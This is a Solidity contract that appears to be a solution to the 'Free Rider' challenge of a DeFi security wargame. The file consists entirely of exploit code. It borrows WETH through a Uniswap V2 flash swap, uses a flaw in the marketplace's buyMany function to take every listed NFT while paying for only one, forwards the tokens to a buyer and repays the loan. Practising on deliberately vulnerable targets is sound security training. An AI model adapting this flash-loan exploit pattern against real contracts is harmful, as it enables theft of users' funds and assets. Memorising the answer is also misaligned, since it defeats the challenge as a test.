// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IWETH9 {
    function withdraw(uint256 amount0) external;

    function deposit() external payable;

    function transfer(address dst, uint256 wad) external returns (bool);
}

contract AttackerFreeRiderUniswapCallee is IUniswapV2Callee, IERC721Receiver {
    address public marketplace;
    address public uniswapPair;
    address public weth;
    address public nft;
    address public buyer;

    constructor(
        address uniswapPair_,
        address marketplace_,
        address nft_,
        address weth_,
        address buyer_
    ) {
        marketplace = marketplace_;
        uniswapPair = uniswapPair_;
        nft = nft_;
        weth = weth_;
        buyer = buyer_;
    }

    /**
     * Borrows wETH from Uniswap pair
     */
    function borrowAndBuyAll(uint256 amount, uint256[] calldata tokenIds)
        external
    {
        address token0 = IUniswapV2Pair(uniswapPair).token0();
        address token1 = IUniswapV2Pair(uniswapPair).token1();

        uint256 amountOut0 = token0 == weth ? amount : 0;
        uint256 amountOut1 = token1 == weth ? amount : 0;

        bytes memory data = abi.encode(amount, tokenIds);
        IUniswapV2Pair(uniswapPair).swap(
            amountOut0,
            amountOut1,
            address(this),
            data
        );
    }

    function uniswapV2Call(
        address sender,
        uint256,
        uint256,
        bytes calldata data
    ) external override {
        require(sender == address(this), "sender was not this contract!");

        // `amount` number of wETH borrowed
        (uint256 amount, uint256[] memory tokenIds) = abi.decode(
            data,
            (uint256, uint256[])
        );

        // Redeem ETH from wETH
        IWETH9(weth).withdraw(amount);

        // Buy all NFTs by executing buggy marketplace buy function
        FreeRiderNFTMarketplace(payable(marketplace)).buyMany{value: amount}(
            tokenIds
        );

        // Send all NFTs to buyer
        for (uint256 i = 0; i < tokenIds.length; ++i) {
            ERC721(nft).safeTransferFrom(address(this), buyer, tokenIds[i]);
        }

        // Return borrowed amount back with fee
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;
        IWETH9(weth).deposit{value: amountToRepay}();
        IWETH9(weth).transfer(uniswapPair, amountToRepay);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
